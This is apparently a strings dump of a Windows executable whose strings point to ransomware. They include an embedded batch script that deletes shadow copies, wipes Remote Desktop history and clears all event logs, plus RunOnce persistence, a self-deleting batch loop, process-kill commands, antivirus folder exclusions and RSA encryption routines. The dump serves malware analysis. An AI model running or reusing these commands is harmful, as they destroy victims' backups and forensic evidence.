[Strings]
nth  paddr      vaddr      len size section type    string
――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0    0x0000004d 0x0000004d 44  45           ascii   !This program cannot be run in DOS mode.\r\r\n$
1    0x000000d8 0x000000d8 5   6            ascii   RichF
2    0x000001f0 0x000001f0 5   6            ascii   .text
3    0x00000217 0x00000217 7   8            ascii   `.rdata
4    0x0000023f 0x0000023f 6   7            ascii   @.data
5    0x00000268 0x00000268 5   6            ascii   .rsrc
1374 0x00016980 0x00417d80 5   12   .rdata  utf16le uk-ua
1375 0x0001698c 0x00417d8c 5   12   .rdata  utf16le ur-pk
1376 0x00016998 0x00417d98 10  22   .rdata  utf16le uz-uz-cyrl
1377 0x000169b0 0x00417db0 10  22   .rdata  utf16le uz-uz-latn
1378 0x000169c8 0x00417dc8 5   12   .rdata  utf16le vi-vn
1379 0x000169d4 0x00417dd4 5   12   .rdata  utf16le xh-za
1380 0x000169e0 0x00417de0 6   14   .rdata  utf16le zh-chs
1381 0x000169f0 0x00417df0 6   14   .rdata  utf16le zh-cht
1382 0x00016a00 0x00417e00 5   12   .rdata  utf16le zh-cn
1383 0x00016a0c 0x00417e0c 5   12   .rdata  utf16le zh-hk
1384 0x00016a18 0x00417e18 5   12   .rdata  utf16le zh-mo
1385 0x00016a24 0x00417e24 5   12   .rdata  utf16le zh-sg
1386 0x00016a30 0x00417e30 5   12   .rdata  utf16le zh-tw
1387 0x00016a3c 0x00417e3c 5   12   .rdata  utf16le zu-za
1388 0x00016a54 0x00417e54 5   6    .rdata  ascii   e+000
1389 0x00016a5c 0x00417e5c 6   7    .rdata  ascii   1#SNAN
1390 0x00016a64 0x00417e64 5   6    .rdata  ascii   1#IND
1391 0x00016a6c 0x00417e6c 5   6    .rdata  ascii   1#INF
1392 0x00016a74 0x00417e74 6   7    .rdata  ascii   1#QNAN
1393 0x00016a7c 0x00417e7c 12  26   .rdata  utf16le Kernel32.dll
1394 0x00016a98 0x00417e98 15  16   .rdata  ascii   Process32FirstW
1395 0x00016aa8 0x00417ea8 14  15   .rdata  ascii   Process32NextW
1396 0x00016ab8 0x00417eb8 24  25   .rdata  ascii   CreateToolhelp32Snapshot
1397 0x00016ad4 0x00417ed4 20  21   .rdata  ascii   taskkill /F /T /PID 
1398 0x00016af0 0x00417ef0 16  17   .rdata  ascii   0123456789ABCDEF
1399 0x00016b38 0x00417f38 19  80   .rdata  utf32le %)+/5;=CGIOSYaegkmq
1400 0x00016fbd 0x004183bd 5   6    .rdata  ascii   }\fUt]
1401 0x00016fdc 0x004183dc 5   7    .rdata  utf8    ̡\f$o, blocks=Combining Diacritical Marks,Basic Latin
1402 0x00016fef 0x004183ef 4   5    .rdata  ascii   vRQ>
1403 0x00017013 0x00418413 5   6    .rdata  ascii   '8!\e.
1404 0x0001701d 0x0041841d 7   8    .rdata  ascii   \r8STs\ne
1405 0x00017025 0x00418425 4   5    .rdata  ascii   \njv.
1406 0x0001703a 0x0041843a 4   6    .rdata  utf8    K£Ql blocks=Basic Latin,Latin-1 Supplement
1407 0x00017058 0x00418458 4   5    .rdata  ascii   LwH'
1408 0x00017067 0x00418467 4   6    .rdata  utf8    NOʜ[ blocks=Basic Latin,IPA Extensions
1409 0x0001706d 0x0041846d 7   10   .rdata  utf8    o.htoc blocks=Basic Latin,Private Use Area
1410 0x00017090 0x00418490 6   7    .rdata  ascii   SHA224
1411 0x00017098 0x00418498 6   7    .rdata  ascii   SHA256
1412 0x000170ac 0x004184ac 23  24   .rdata  ascii   sha224WithRSAEncryption
1413 0x000170c4 0x004184c4 16  17   .rdata  ascii   RSA with SHA-224
1414 0x000170e4 0x004184e4 23  24   .rdata  ascii   sha256WithRSAEncryption
1415 0x000170fc 0x004184fc 16  17   .rdata  ascii   RSA with SHA-256
1416 0x0001711c 0x0041851c 10  11   .rdata  ascii   RSASSA-PSS
1417 0x00017134 0x00418534 13  14   .rdata  ascii   rsaEncryption
1418 0x00017150 0x00418550 14  15   .rdata  ascii   id-ecPublicKey
1419 0x00017160 0x00418560 14  15   .rdata  ascii   Generic EC key
1420 0x00017178 0x00418578 7   8    .rdata  ascii   id-ecDH
1421 0x00017180 0x00418580 15  16   .rdata  ascii   EC key for ECDH
1422 0x00017198 0x00418598 6   7    .rdata  ascii   desCBC
1423 0x000171a0 0x004185a0 7   8    .rdata  ascii   DES-CBC
1424 0x000171b4 0x004185b4 12  13   .rdata  ascii   des-ede3-cbc
1425 0x000171c4 0x004185c4 12  13   .rdata  ascii   DES-EDE3-CBC
1426 0x000171e0 0x004185e0 9   10   .rdata  ascii   id-sha224
1427 0x000171ec 0x004185ec 7   8    .rdata  ascii   SHA-224
1428 0x00017200 0x00418600 9   10   .rdata  ascii   id-sha256
1429 0x0001720c 0x0041860c 7   8    .rdata  ascii   SHA-256
1430 0x00017214 0x00418614 6   7    .rdata  ascii   010001
1431 0x0001721c 0x0041861c 7   8    .rdata  ascii   windows
1432 0x00017224 0x00418624 9   10   .rdata  ascii   Microsoft
1433 0x00017230 0x00418630 14  15   .rdata  ascii   Microsoft Help
1434 0x00017240 0x00418640 29  30   .rdata  ascii   Windows App Certification Kit
1435 0x00017260 0x00418660 16  17   .rdata  ascii   Windows Defender
1436 0x00017274 0x00418674 4   5    .rdata  ascii   ESET
1437 0x0001727c 0x0041867c 6   7    .rdata  ascii   COMODO
1438 0x00017284 0x00418684 10  11   .rdata  ascii   Windows NT
1439 0x00017290 0x00418690 12  13   .rdata  ascii   Windows Kits
1440 0x000172a0 0x004186a0 12  13   .rdata  ascii   Windows Mail
1441 0x000172b0 0x004186b0 20  21   .rdata  ascii   Windows Media Player
1442 0x000172c8 0x004186c8 27  28   .rdata  ascii   Windows Multimedia Platform
1443 0x000172e4 0x004186e4 18  19   .rdata  ascii   Windows Phone Kits
1444 0x000172f8 0x004186f8 30  31   .rdata  ascii   Windows Phone Silverlight Kits
1445 0x00017318 0x00418718 20  21   .rdata  ascii   Windows Photo Viewer
1446 0x00017330 0x00418730 24  25   .rdata  ascii   Windows Portable Devices
1447 0x0001734c 0x0041874c 15  16   .rdata  ascii   Windows Sidebar
1448 0x0001735c 0x0041875c 17  18   .rdata  ascii   WindowsPowerShell
1449 0x00017370 0x00418770 4   5    .rdata  ascii   Temp
1450 0x00017378 0x00418778 18  19   .rdata  ascii   NVIDIA Corporation
1451 0x0001738c 0x0041878c 13  14   .rdata  ascii   Microsoft.NET
1452 0x0001739c 0x0041879c 17  18   .rdata  ascii   Internet Explorer
1453 0x000173b0 0x004187b0 13  14   .rdata  ascii   Kaspersky Lab
1454 0x000173c0 0x004187c0 6   7    .rdata  ascii   McAfee
1455 0x000173c8 0x004187c8 5   6    .rdata  ascii   Avira
1456 0x000173d0 0x004187d0 16  17   .rdata  ascii   spytech software
1457 0x000173e4 0x004187e4 9   10   .rdata  ascii   sysconfig
1458 0x000173f0 0x004187f0 5   6    .rdata  ascii   Avast
1459 0x000173f8 0x004187f8 6   7    .rdata  ascii   Dr.Web
1460 0x00017400 0x00418800 8   9    .rdata  ascii   Symantec
1461 0x0001740c 0x0041880c 24  25   .rdata  ascii   Symantec_Client_Security
1462 0x00017428 0x00418828 25  26   .rdata  ascii   system volume information
1463 0x00017448 0x00418848 16  17   .rdata  ascii   Microsoft Shared
1464 0x0001745c 0x0041885c 12  13   .rdata  ascii   Common Files
1465 0x0001746c 0x0041886c 15  16   .rdata  ascii   Outlook Express
1466 0x0001747c 0x0041887c 11  12   .rdata  ascii   Movie Maker
1467 0x00017488 0x00418888 6   7    .rdata  ascii   Chrome
1468 0x00017490 0x00418890 15  16   .rdata  ascii   Mozilla Firefox
1469 0x000174a0 0x004188a0 5   6    .rdata  ascii   Opera
1470 0x000174a8 0x004188a8 13  14   .rdata  ascii   YandexBrowser
1471 0x000174b8 0x004188b8 5   6    .rdata  ascii   ntldr
1472 0x000174c0 0x004188c0 4   5    .rdata  ascii   wsus
1473 0x000174c8 0x004188c8 4   5    .rdata  ascii   Wsus
1474 0x000174d0 0x004188d0 11  12   .rdata  ascii   ProgramData
1475 0x000174e0 0x004188e0 445 446  .rdata  ascii   @echo off\r\nvssadmin.exe Delete Shadows /All /Quiet\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default" /va /f\r\nreg delete "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" /f\r\nreg add "HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers"\r\ncd %userprofile%\documents\\r\nattrib Default.rdp -s -h\r\ndel Default.rdp \r\nfor /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
1476 0x000176a0 0x00418aa0 5   12   .rdata  utf16le __tmp
1477 0x000176ac 0x00418aac 4   10   .rdata  utf16le .bat
1478 0x000176b8 0x00418ab8 14  30   .rdata  utf16le :Repeat\r\ndel "
1479 0x000176d8 0x00418ad8 13  28   .rdata  utf16le "\r\nif exist "
1480 0x000176f4 0x00418af4 20  42   .rdata  utf16le " goto Repeat\r\ndel "
1481 0x00017728 0x00418b28 4   20   .rdata  utf32le p\*.
1482 0x00017750 0x00418b50 49  100  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\RunOnce
1483 0x000177b4 0x00418bb4 17  36   .rdata  utf16le CertificatesCheck
1484 0x000177dc 0x00418bdc 7   8    .rdata  ascii   outlook
1485 0x000177e4 0x00418be4 4   5    .rdata  ascii   ssms
1486 0x000177ec 0x00418bec 7   8    .rdata  ascii   postgre
1487 0x000177f8 0x00418bf8 5   6    .rdata  ascii   excel
1488 0x00017800 0x00418c00 4   5    .rdata  ascii   word
1489 0x00017808 0x00418c08 4   10   .rdata  utf16le temp
1490 0x00017814 0x00418c14 5   12   .rdata  utf16le KDATA
1491 0x00017820 0x00418c20 46  94   .rdata  utf16le \Microsoft\SystemCertificates\My\Certificates\
1492 0x00017880 0x00418c80 7   16   .rdata  utf16le appdata
1493 0x00017890 0x00418c90 5   12   .rdata  utf16le .html
1494 0x000178a0 0x00418ca0 6   14   .rdata  utf16le EXDATA
1495 0x000178b0 0x00418cb0 6   14   .rdata  utf16le CODATA
1496 0x000178c0 0x00418cc0 11  12   .rdata  ascii   rsa_encrypt
1497 0x000178cc 0x00418ccc 10  11   .rdata  ascii   rsa_genkey
1498 0x00017e4e 0x0041924e 9   10   .rdata  ascii   HeapAlloc
1499 0x00017e5a 0x0041925a 12  13   .rdata  ascii   LoadLibraryW
1500 0x00017e6a 0x0041926a 10  11   .rdata  ascii   HeapCreate
1501 0x00017e78 0x00419278 14  15   .rdata  ascii   CreateProcessA
1502 0x00017e8a 0x0041928a 14  15   .rdata  ascii   GetProcAddress
1503 0x00017e9c 0x0041929c 11  12   .rdata  ascii   CloseHandle
1504 0x00017eaa 0x004192aa 8   9    .rdata  ascii   lstrlenA
1505 0x00017eb6 0x004192b6 16  17   .rdata  ascii   SetFilePointerEx
1506 0x00017eca 0x004192ca 9   10   .rdata  ascii   WriteFile
1507 0x00017ed6 0x004192d6 19  20   .rdata  ascii   WideCharToMultiByte
1508 0x00017eec 0x004192ec 8   9    .rdata  ascii   ReadFile
1509 0x00017ef8 0x004192f8 11  12   .rdata  ascii   CreateFileW
1510 0x00017f06 0x00419306 13  14   .rdata  ascii   GetFileSizeEx
1511 0x00017f16 0x00419316 12  13   .rdata  ascii   GetLastError
1512 0x00017f26 0x00419326 11  12   .rdata  ascii   ExitProcess
1513 0x00017f34 0x00419334 23  24   .rdata  ascii   GetEnvironmentVariableW
1514 0x00017f4e 0x0041934e 16  17   .rdata  ascii   GetTempFileNameW
1515 0x00017f62 0x00419362 14  15   .rdata  ascii   FindFirstFileW
1516 0x00017f74 0x00419374 14  15   .rdata  ascii   SetFilePointer
1517 0x00017f86 0x00419386 12  13   .rdata  ascii   FreeResource
1518 0x00017f96 0x00419396 9   10   .rdata  ascii   lstrcpynA
1519 0x00017fa2 0x004193a2 13  14   .rdata  ascii   FindResourceW
1520 0x00017fb2 0x004193b2 12  13   .rdata  ascii   LoadResource
1521 0x00017fc2 0x004193c2 14  15   .rdata  ascii   CreateProcessW
1522 0x00017fd4 0x004193d4 11  12   .rdata  ascii   MoveFileExW
1523 0x00017fe2 0x004193e2 8   9    .rdata  ascii   HeapFree
1524 0x00017fee 0x004193ee 16  17   .rdata  ascii   GetLogicalDrives
1525 0x00018002 0x00419402 23  24   .rdata  ascii   SetThreadExecutionState
1526 0x0001801c 0x0041941c 14  15   .rdata  ascii   GetProcessHeap
1527 0x0001802e 0x0041942e 13  14   .rdata  ascii   GetDriveTypeA
1528 0x0001803e 0x0041943e 9   10   .rdata  ascii   CopyFileW
1529 0x0001804a 0x0041944a 14  15   .rdata  ascii   SizeofResource
1530 0x0001805c 0x0041945c 11  12   .rdata  ascii   HeapDestroy
1531 0x0001806a 0x0041946a 18  19   .rdata  ascii   GetFileAttributesW
1532 0x00018080 0x00419480 18  19   .rdata  ascii   GetModuleFileNameW
1533 0x00018096 0x00419496 19  20   .rdata  ascii   MultiByteToWideChar
1534 0x000180ac 0x004194ac 8   9    .rdata  ascii   lstrlenW
1535 0x000180b8 0x004194b8 12  13   .rdata  ascii   GetStdHandle
1536 0x000180c8 0x004194c8 9   10   .rdata  ascii   lstrcmpiA
1537 0x000180d4 0x004194d4 9   10   .rdata  ascii   FindClose
1538 0x000180e0 0x004194e0 10  11   .rdata  ascii   LocalAlloc
1539 0x000180ee 0x004194ee 12  13   .rdata  ascii   LockResource
1540 0x000180fe 0x004194fe 9   10   .rdata  ascii   lstrcmpiW
1541 0x0001810a 0x0041950a 8   9    .rdata  ascii   lstrcatW
1542 0x00018116 0x00419516 13  14   .rdata  ascii   FindNextFileW
1543 0x00018126 0x00419526 14  15   .rdata  ascii   CompareStringA
1544 0x00018138 0x00419538 9   10   .rdata  ascii   LocalFree
1545 0x00018144 0x00419544 18  19   .rdata  ascii   SetFileAttributesW
1546 0x0001815a 0x0041955a 8   9    .rdata  ascii   lstrcpyW
1547 0x00018166 0x00419566 8   9    .rdata  ascii   lstrcpyA
1548 0x00018170 0x00419570 12  13   .rdata  ascii   KERNEL32.dll
1549 0x00018180 0x00419580 20  21   .rdata  ascii   CryptAcquireContextW
1550 0x00018198 0x00419598 19  20   .rdata  ascii   CryptReleaseContext
1551 0x000181ae 0x004195ae 14  15   .rdata  ascii   CryptGenRandom
1552 0x000181c0 0x004195c0 15  16   .rdata  ascii   RegCreateKeyExW
1553 0x000181d2 0x004195d2 16  17   .rdata  ascii   RegQueryValueExW
1554 0x000181e6 0x004195e6 13  14   .rdata  ascii   RegOpenKeyExW
1555 0x000181f6 0x004195f6 20  21   .rdata  ascii   GetCurrentHwProfileW
1556 0x0001820e 0x0041960e 11  12   .rdata  ascii   RegCloseKey
1557 0x0001821c 0x0041961c 14  15   .rdata  ascii   RegSetValueExW
1558 0x0001822c 0x0041962c 12  13   .rdata  ascii   ADVAPI32.dll
1559 0x0001823c 0x0041963c 15  16   .rdata  ascii   StringFromGUID2
1560 0x0001824e 0x0041964e 12  13   .rdata  ascii   CoCreateGuid
1561 0x0001825c 0x0041965c 9   10   .rdata  ascii   ole32.dll
1562 0x00018268 0x00419668 17  18   .rdata  ascii   PathFindFileNameW
1563 0x0001827c 0x0041967c 19  20   .rdata  ascii   PathRemoveFileSpecW
1564 0x00018290 0x00419690 11  12   .rdata  ascii   SHLWAPI.dll
1565 0x0001829e 0x0041969e 15  16   .rdata  ascii   GetCommandLineA
1566 0x000182b0 0x004196b0 25  26   .rdata  ascii   IsProcessorFeaturePresent
1567 0x000182cc 0x004196cc 17  18   .rdata  ascii   IsDebuggerPresent
1568 0x000182e0 0x004196e0 13  14   .rdata  ascii   EncodePointer
1569 0x000182f0 0x004196f0 13  14   .rdata  ascii   DecodePointer
1570 0x00018300 0x00419700 20  21   .rdata  ascii   EnterCriticalSection
1571 0x00018318 0x00419718 20  21   .rdata  ascii   LeaveCriticalSection
1572 0x00018330 0x00419730 11  12   .rdata  ascii   GetFileType
1573 0x0001833e 0x0041973e 21  22   .rdata  ascii   DeleteCriticalSection
1574 0x00018356 0x00419756 15  16   .rdata  ascii   GetStartupInfoW
1575 0x00018368 0x00419768 12  13   .rdata  ascii   GetConsoleCP
1576 0x00018378 0x00419778 14  15   .rdata  ascii   GetConsoleMode
1577 0x0001838a 0x0041978a 9   10   .rdata  ascii   RtlUnwind
1578 0x00018396 0x00419796 12  13   .rdata  ascii   SetLastError
1579 0x000183a6 0x004197a6 18  19   .rdata  ascii   GetCurrentThreadId
1580 0x000183bc 0x004197bc 18  19   .rdata  ascii   GetModuleHandleExW
1581 0x000183d2 0x004197d2 18  19   .rdata  ascii   GetModuleFileNameA
1582 0x000183e8 0x004197e8 23  24   .rdata  ascii   QueryPerformanceCounter
1583 0x00018402 0x00419802 19  20   .rdata  ascii   GetCurrentProcessId
1584 0x00018418 0x00419818 23  24   .rdata  ascii   GetSystemTimeAsFileTime
1585 0x00018432 0x00419832 22  23   .rdata  ascii   GetEnvironmentStringsW
1586 0x0001844c 0x0041984c 23  24   .rdata  ascii   FreeEnvironmentStringsW
1587 0x00018466 0x00419866 24  25   .rdata  ascii   UnhandledExceptionFilter
1588 0x00018482 0x00419882 27  28   .rdata  ascii   SetUnhandledExceptionFilter
1589 0x000184a0 0x004198a0 37  38   .rdata  ascii   InitializeCriticalSectionAndSpinCount
1590 0x000184c8 0x004198c8 5   6    .rdata  ascii   Sleep
1591 0x000184d0 0x004198d0 17  18   .rdata  ascii   GetCurrentProcess
1592 0x000184e4 0x004198e4 16  17   .rdata  ascii   TerminateProcess
1593 0x000184f8 0x004198f8 8   9    .rdata  ascii   TlsAlloc
1594 0x00018504 0x00419904 11  12   .rdata  ascii   TlsGetValue
1595 0x00018512 0x00419912 11  12   .rdata  ascii   TlsSetValue
1596 0x00018520 0x00419920 7   8    .rdata  ascii   TlsFree
1597 0x0001852a 0x0041992a 16  17   .rdata  ascii   GetModuleHandleW
1598 0x0001853e 0x0041993e 12  13   .rdata  ascii   SetStdHandle
1599 0x0001854e 0x0041994e 13  14   .rdata  ascii   WriteConsoleW
1600 0x0001855e 0x0041995e 16  17   .rdata  ascii   FlushFileBuffers
1601 0x00018572 0x00419972 15  16   .rdata  ascii   IsValidCodePage
1602 0x00018584 0x00419984 6   7    .rdata  ascii   GetACP
1603 0x0001858e 0x0041998e 8   9    .rdata  ascii   GetOEMCP
1604 0x0001859a 0x0041999a 9   10   .rdata  ascii   GetCPInfo
1605 0x000185a6 0x004199a6 14  15   .rdata  ascii   LoadLibraryExW
1606 0x000185b8 0x004199b8 18  19   .rdata  ascii   OutputDebugStringW
1607 0x000185ce 0x004199ce 11  12   .rdata  ascii   HeapReAlloc
1608 0x000185dc 0x004199dc 14  15   .rdata  ascii   GetStringTypeW
1609 0x000185ee 0x004199ee 8   9    .rdata  ascii   HeapSize
1610 0x000185fa 0x004199fa 12  13   .rdata  ascii   LCMapStringW
1611 0x00018834 0x0041a034 12  52   .data   utf32le \t\a\f\b\f\t\f\n\a\v\b\f
1612 0x000188b8 0x0041a0b8 5   24   .data   utf32le R\rS\rW
1613 0x000188d0 0x0041a0d0 7   32   .data   utf32le Y\vl\rm p
1614 0x00018944 0x0041a144 4   20   .data   utf32le \v§\r· blocks=Basic Latin,Latin-1 Supplement
1615 0x00018ef2 0x0041a6f2 26  27   .data   ascii                             
1616 0x00018fd9 0x0041a7d9 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1617 0x00018ff9 0x0041a7f9 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1618 0x00019112 0x0041a912 26  27   .data   ascii                             
1619 0x000191f2 0x0041a9f2 26  27   .data   ascii   abcdefghijklmnopqrstuvwxyz
1620 0x00019212 0x0041aa12 26  27   .data   ascii   ABCDEFGHIJKLMNOPQRSTUVWXYZ
1621 0x000196a0 0x0041aea0 4   20   .data   utf32le 5\v@Ͽ blocks=Basic Latin,Greek and Coptic
1622 0x0001978a 0x0041af8a 4   5    .data   ascii   kU'9
1623 0x000197da 0x0041afda 8   11   .data   utf8    HMXB䧓9;5 blocks=Basic Latin,CJK Unified Ideographs Extension A
1624 0x00019814 0x0041b014 5   8    .data   utf8    ]݀nLɛ blocks=Basic Latin,Syriac,IPA Extensions
1625 0x00019833 0x0041b033 9   12   .data   utf8    ?q=\nףp=\nף blocks=Basic Latin,Hebrew
1626 0x0001983f 0x0041b03f 4   5    .data   ascii   ?Zd;
1627 0x00019887 0x0041b087 4   5    .data   ascii   ?/L[
1628 0x00019896 0x0041b096 4   5    .data   ascii   S;uD
1629 0x000198a9 0x0041b0a9 4   6    .data   utf8    ϔ?$# blocks=Greek and Coptic,Basic Latin
1630 0x000198af 0x0041b0af 4   7    .data   utf8    ⼺;1a blocks=Kangxi Radicals,Basic Latin
1631 0x000198b6 0x0041b0b6 5   6    .data   ascii   z?aUY
1632 0x000198ce 0x0041b0ce 4   5    .data   ascii   D?$?
1633 0x000198e6 0x0041b0e6 4   5    .data   ascii   U>c{
1634 0x000198f8 0x0041b0f8 8   10   .data   utf8    zc%C1,<!
1635 0x0001990b 0x0041b10b 5   7    .data   utf8    ;܈X\b\e blocks=Basic Latin,Syriac
1636 0x00019917 0x0041b117 5   7    .data   utf8    ;ƄEB\a blocks=Basic Latin,Latin Extended-B
1637 0x00019922 0x0041b122 4   5    .data   ascii   .:3q
1638 0x0001994b 0x0041b14b 5   6    .data   ascii   -64OS
1639 0x0001996c 0x0041b16c 4   5    .data   ascii   NKeb
1640 0x00019e3a 0x0042523a 6   14   .rsrc   utf16le CODATA
1641 0x00019e48 0x00425248 5   12   .rsrc   utf16le DDATA
1642 0x00019e54 0x00425254 6   14   .rsrc   utf16le EXDATA
1643 0x00019e62 0x00425262 5   11   .rsrc   utf16le KDATA
1644 0x00019f04 0x00425304 4   5    .rsrc   ascii   c)EK
1645 0x00019f09 0x00425309 4   5    .rsrc   ascii   ~\t3$
1646 0x00019f18 0x00425318 6   8    .rsrc   utf8    ||H,eӑ blocks=Basic Latin,Cyrillic
1647 0x00019f8d 0x0042538d 6   7    .rsrc   ascii   z|pt(k
1648 0x00019fdf 0x004253df 4   5    .rsrc   ascii   o1\b0
1649 0x0001a0c3 0x004254c3 4   5    .rsrc   ascii   ;x}N
1650 0x0001a0d7 0x004254d7 5   6    .rsrc   ascii   Oh4S[
1651 0x0001a145 0x00425545 5   6    .rsrc   ascii   986s\b
1652 0x0001a167 0x00425567 4   5    .rsrc   ascii   M~a\f
1653 0x0001a1b2 0x004255b2 4   5    .rsrc   ascii   'y@Z
1654 0x0001a22b 0x0042562b 5   6    .rsrc   ascii   =~w(0
1655 0x0001a293 0x00425693 4   5    .rsrc   ascii   M4S"
1656 0x0001a2a3 0x004256a3 4   5    .rsrc   ascii   PhcS
1657 0x0001a2de 0x004256de 5   6    .rsrc   ascii   ]AORL
1658 0x0001a2f0 0x004256f0 7   10   .rsrc   utf8    7d-٥ӐI2 blocks=Basic Latin,Arabic,Cyrillic
1659 0x0001a31b 0x0042571b 4   7    .rsrc   utf8    x@Ȧу blocks=Basic Latin,Latin Extended-B,Cyrillic
1660 0x0001a33b 0x0042573b 5   6    .rsrc   ascii   MpAA{
1661 0x0001a36f 0x0042576f 4   7    .rsrc   utf8    $㕖&o blocks=Basic Latin,CJK Unified Ideographs Extension A
1662 0x0001a377 0x00425777 4   5    .rsrc   ascii   .r*|
1663 0x0001a386 0x00425786 4   6    .rsrc   utf8    [dڎ& blocks=Basic Latin,Arabic
1664 0x0001a398 0x00425798 6   7    .rsrc   ascii   ro\tE=P
1665 0x0001a3b5 0x004257b5 4   5    .rsrc   ascii   DE,(
1666 0x0001a3c5 0x004257c5 5   8    .rsrc   utf8    6!!\e blocks=Private Use Area,Basic Latin
1667 0x0001a3d4 0x004257d4 4   7    .rsrc   utf8    枴=hc blocks=CJK Unified Ideographs,Basic Latin
1668 0x0001a3e2 0x004257e2 4   5    .rsrc   ascii   C{(!
1669 0x0001a475 0x00425875 4   6    .rsrc   utf8    ʂk3\n blocks=IPA Extensions,Basic Latin
1670 0x0001a4b8 0x004258b8 4   5    .rsrc   ascii   9nNM
1671 0x0001a503 0x00425903 8   10   .rsrc   utf8    ڣg-;{+0[ blocks=Arabic,Basic Latin
1672 0x0001a528 0x00425928 5   8    .rsrc   utf8    $\v?L blocks=Basic Latin,Private Use Area
1673 0x0001a538 0x00425938 12  16   .rsrc   utf8    |D@ٗ}p/ɲZ0); blocks=Basic Latin,Arabic,IPA Extensions
1674 0x0001a54c 0x0042594c 5   6    .rsrc   ascii   c5\n_l
1675 0x0001a552 0x00425952 5   7    .rsrc   utf8    &X<æ> blocks=Basic Latin,Latin-1 Supplement
1676 0x0001a59f 0x0042599f 4   5    .rsrc   ascii   <9*q
1677 0x0001a5aa 0x004259aa 4   5    .rsrc   ascii   rI"\e
1678 0x0001a5d0 0x004259d0 4   5    .rsrc   ascii   EG`\t
1679 0x0001a623 0x00425a23 5   6    .rsrc   ascii   Sx(e 
1680 0x0001a63d 0x00425a3d 4   6    .rsrc   utf8    C\rSϯ blocks=Basic Latin,Greek and Coptic
1681 0x0001a643 0x00425a43 4   5    .rsrc   ascii   $`3k
1682 0x0001a68f 0x00425a8f 4   5    .rsrc   ascii   Z1$o
1683 0x0001a6a1 0x00425aa1 4   6    .rsrc   utf8    \n%Kͽ blocks=Basic Latin,Greek and Coptic
1684 0x0001a6cc 0x00425acc 5   6    .rsrc   ascii   \r\eho\a
1685 0x0001a777 0x00425b77 4   5    .rsrc   ascii   #\r2}
1686 0x0001a781 0x00425b81 5   7    .rsrc   utf8    ~!@È' blocks=Basic Latin,Latin-1 Supplement
1687 0x0001a7d1 0x00425bd1 5   7    .rsrc   utf8    4sPՕ\a blocks=Basic Latin,Armenian
1688 0x0001a7dd 0x00425bdd 4   6    .rsrc   utf8    r͛X! blocks=Basic Latin,Combining Diacritical Marks
1689 0x0001a7f5 0x00425bf5 8   10   .rsrc   utf8    Θp|oF#s# blocks=Greek and Coptic,Basic Latin
1690 0x0001a808 0x00425c08 4   5    .rsrc   ascii   Pb!l
1691 0x0001a829 0x00425c29 5   8    .rsrc   utf8    \EҾcƑ blocks=Basic Latin,Cyrillic,Latin Extended-B
1692 0x0001a858 0x00425c58 4   5    .rsrc   ascii   /\tX&
1693 0x0001a85f 0x00425c5f 4   5    .rsrc   ascii   qLW&
1694 0x0001a8ca 0x00425cca 4   5    .rsrc   ascii   @<Yj
1695 0x0001a8cf 0x00425ccf 6   7    .rsrc   ascii   ?DYe(k
1696 0x0001a90b 0x00425d0b 4   5    .rsrc   ascii   ]*aT
1697 0x0001a947 0x00425d47 4   5    .rsrc   ascii   ?*L+
1698 0x0001a94d 0x00425d4d 6   8    .rsrc   utf8    T<0lМE blocks=Basic Latin,Cyrillic
1699 0x0001a95b 0x00425d5b 4   5    .rsrc   ascii   #Vn/
1700 0x0001a96b 0x00425d6b 4   6    .rsrc   utf8    1Ժ`p blocks=Basic Latin,Armenian
1701 0x0001a978 0x00425d78 6   8    .rsrc   utf8    kג;m|% blocks=Basic Latin,Hebrew
1702 0x0001a98b 0x00425d8b 4   5    .rsrc   ascii   >|2\v
1703 0x0001a9ac 0x00425dac 4   5    .rsrc   ascii   ^75r
1704 0x0001a9e4 0x00425de4 4   5    .rsrc   ascii   NV8Z
1705 0x0001aa3b 0x00425e3b 4   6    .rsrc   utf8    J ژ- blocks=Basic Latin,Arabic
1706 0x0001aa4a 0x00425e4a 4   5    .rsrc   ascii   `]T(
1707 0x0001aa51 0x00425e51 4   5    .rsrc   ascii   ^\feU
1708 0x0001aa61 0x00425e61 4   5    .rsrc   ascii   8%~~
